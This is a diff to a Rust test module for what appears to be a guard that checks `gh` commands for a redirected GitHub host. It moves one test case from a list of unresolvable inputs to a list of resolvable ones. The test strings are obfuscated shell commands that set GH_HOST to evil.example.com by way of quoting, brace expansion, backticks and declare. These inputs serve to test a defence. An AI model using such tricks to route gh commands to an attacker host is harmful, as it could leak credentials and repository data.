@@ -7362,6 +7362,10 @@ mod tests {
                 // `GH_HOST=x` and `GH_HOS=x`, so the host resolves outright
                 // rather than as unknown.
                 "export GH_HOS{T,}=evil.example.com; gh pr create -R cameronsjo/x --title t",
+                // Locale quoting is a plain string in the C locale, so bash
+                // exports `GH_HOST=evil.example.com` here and the tokenizer now
+                // reads it that way: the host resolves outright.
+                r#"export GH_HOS$"T"=evil.example.com; gh pr create -R cameronsjo/x --title t"#,
             ] {
                 let result = GhWriteGuard.run(&input_with(command, "/tmp"));
                 let meta = result
@@ -7706,7 +7710,6 @@ mod tests {
                 "(( GH_HOST += 1 )); gh pr create -R cameronsjo/x --title t",
                 // #548 review I2: a name the shell builds at expansion time.
                 "export GH_HOS${X}T=evil.example.com; gh pr create -R cameronsjo/x --title t",
-                r#"export GH_HOS$"T"=evil.example.com; gh pr create -R cameronsjo/x --title t"#,
                 "export GH_HOS`printf T`=evil.example.com; gh pr create -R cameronsjo/x --title t",
                 "declare -x GH_HOS${X}T=evil.example.com; gh pr create -R cameronsjo/x --title t",
                 "typeset -x GH_HOST=evil.example.com; gh pr create -R cameronsjo/x --title t",
